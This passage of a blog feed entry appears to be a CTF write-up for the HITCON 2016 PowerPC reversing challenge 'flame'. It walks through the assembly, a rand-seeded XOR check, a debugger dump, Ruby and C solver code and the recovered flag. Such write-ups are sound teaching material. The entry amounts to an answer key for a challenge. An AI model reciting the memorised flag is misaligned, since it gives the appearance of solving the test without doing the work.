class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( check[i] != secret[i] )</span><br><span class="line">            &#123;</span><br><span class="line">                fail();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        success();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        fail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The most challenging part is the line <code>check[i] = flag[i] ^ (r &amp; 0xfff);</code>, it actually look like this in the PowerPC assembly: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// r = rand();</span><br><span class="line">bl        rand</span><br><span class="line">mr        r9, r3</span><br><span class="line">// r = r &amp; 0xfff</span><br><span class="line">clrlwi    r10, r9, 20 &lt;-- clear the high-order 20 bits</span><br><span class="line">lwz       r9, 0x18(r31)</span><br><span class="line">slwi      r9, r9, 2</span><br><span class="line">addi      r8, r31, 0x1A0</span><br><span class="line">add       r9, r8, r9</span><br><span class="line">addi      r9, r9, -0x180</span><br><span class="line">stw       r10, 0(r9)</span><br><span class="line">lwz       r9, 0x18(r31)</span><br><span class="line">slwi      r9, r9, 2</span><br><span class="line">addi      r10, r31, 0x1A0</span><br><span class="line">add       r9, r10, r9</span><br><span class="line">addi      r9, r9, -0x180</span><br><span class="line">lwz       r9, 0(r9)</span><br><span class="line">mr        r8, r9</span><br><span class="line">// c = flag[i]</span><br><span class="line">addi      r10, r31, 0x138</span><br><span class="line">lwz       r9, 0x18(r31)</span><br><span class="line">add       r9, r10, r9</span><br><span class="line">lbz       r9, 0(r9)</span><br><span class="line">// check[i] = c ^ r</span><br><span class="line">xor       r9, r8, r9</span><br><span class="line">mr        r10, r9</span><br><span class="line">lwz       r9, 0x18(r31)</span><br><span class="line">slwi      r9, r9, 2</span><br><span class="line">addi      r8, r31, 0x1A0</span><br><span class="line">add       r9, r8, r9</span><br><span class="line">addi      r9, r9, -0x180</span><br><span class="line">stw       r10, 0(r9)</span><br><span class="line">// i++</span><br><span class="line">lwz       r9, 0x18(r31)</span><br><span class="line">addi      r9, r9, 1</span><br><span class="line">stw       r9, 0x18(r31)</span><br></pre></td></tr></table></figure><p>Took me a while to figure out the whole operation.  </p><p>So now we know that the flag is a string with 35 characters. The program will do some operation on our input, then store the result into the <code>check</code> buffer. Then it will compare each byte between the <code>check</code> buffer and the <code>secret</code> buffer, and print out the success message if their content were the same. </p><p>We can dump the content of the <code>secret</code> buffer by using the debbuger. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xf6fff86c:     0x00000cfe      0x00000859      0x0000095d      0x00000871</span><br><span class="line">0xf6fff87c:     0x0000040d      0x00000006      0x00000ade      0x00000fa8</span><br><span class="line">0xf6fff88c:     0x00000561      0x000009da      0x00000878      0x00000682</span><br><span class="line">0xf6fff89c:     0x00000fa9      0x00000f5f      0x0000025e      0x00000db0</span><br><span class="line">0xf6fff8ac:     0x00000fbf      0x00000bc6      0x00000d38      0x0000095d</span><br><span class="line">0xf6fff8bc:     0x00000d09      0x000007ed      0x00000307      0x000001c0</span><br><span class="line">0xf6fff8cc:     0x00000399      0x00000956      0x00000a45      0x00000292</span><br><span class="line">0xf6fff8dc:     0x00000c8a      0x0000092f      0x0000004a      0x00000964</span><br><span class="line">0xf6fff8ec:     0x00000194      0x000009da      0x0000011f</span><br></pre></td></tr></table></figure><p>After that, we can just recover the flag by writing some simple scripts.<br><figure class="highlight ruby"><figcaption><span>sol.rb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"></span><br><span class="line">resp = <span class="string">`./test`</span>.split(<span class="string">"\n"</span>)</span><br><span class="line">seed = []</span><br><span class="line">ans =[<span class="number">0x00000cfe</span>, <span class="number">0x00000859</span>, <span class="number">0x0000095d</span>, <span class="number">0x00000871</span>, <span class="number">0x0000040d</span>,<span class="number">0x00000006</span>,<span class="number">0x00000ade</span>, <span class="number">0x00000fa8</span>, <span class="number">0x00000561</span>,  <span class="number">0x000009da</span> , <span class="number">0x00000878</span>, <span class="number">0x00000682</span>, <span class="number">0x00000fa9</span> , <span class="number">0x00000f5f</span>, <span class="number">0x0000025e</span>, <span class="number">0x00000db0</span>, <span class="number">0x00000fbf</span>, <span class="number">0x00000bc6</span> , <span class="number">0x00000d38</span> , <span class="number">0x0000095d</span>, <span class="number">0x00000d09</span>, <span class="number">0x000007ed</span> , <span class="number">0x00000307</span>, <span class="number">0x000001c0</span>, <span class="number">0x00000399</span>, <span class="number">0x00000956</span> , <span class="number">0x00000a45</span> , <span class="number">0x00000292</span>, <span class="number">0x00000c8a</span>,<span class="number">0x0000092f</span> , <span class="number">0x0000004a</span> , <span class="number">0x00000964</span>, <span class="number">0x00000194</span>,  <span class="number">0x000009da</span>, <span class="number">0x0000011f</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> resp</span><br><span class="line">    seed &lt;&lt; (s.to_i(<span class="number">16</span>) &amp; <span class="number">0xfff</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> seed.zip(ans)</span><br><span class="line">    flag += (a^b).chr</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">puts flag</span><br></pre></td></tr></table></figure></p><p><code>test</code> is a C program for generating the random seed<br><figure class="highlight c"><figcaption><span>test.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    srand(<span class="number">0x1e61</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">35</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, rand());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Result:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># root @ 9c51322c8256 in /mnt/files/hitcon-ctf-2016-qual/flame [8:42:43] C:126</span><br><span class="line">$ ruby ./sol.rb </span><br><span class="line">hitcon&#123;P0W3rPc_a223M8Ly_12_s0_345y&#125;</span><br></pre></td></tr></table></figure></p><p>flag: <code>hitcon{P0W3rPc_a223M8Ly_12_s0_345y}</code></p><p>References of PowerPC:</p><ul><li><a href="http://www.csd.uwo.ca/~mburrel/stuff/ppc-asm.html" target="_blank" rel="noopener">PowerPC Assembly tutorial</a></li><li><a href="http://wiibrew.org/wiki/Assembler_Tutorial" target="_blank" rel="noopener">Assembler Tutorial - WiiBrew</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; PPC ( more like Reverse )&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="PPC" scheme="https://bruce30262.github.io/tags/PPC/"/>
    
      <category term="ruby" scheme="https://bruce30262.github.io/tags/ruby/"/>
    
      <category term="C" scheme="https://bruce30262.github.io/tags/C/"/>
    
      <category term="assembly" scheme="https://bruce30262.github.io/tags/assembly/"/>
    
      <category term="Reversing" scheme="https://bruce30262.github.io/tags/Reversing/"/>
    
      <category term="HITCON" scheme="https://bruce30262.github.io/tags/HITCON/"/>
    
      <category term="PowerPC" scheme="https://bruce30262.github.io/tags/PowerPC/"/>
    
      <category term="qemu" scheme="https://bruce30262.github.io/tags/qemu/"/>
    
  </entry>
  
</feed>
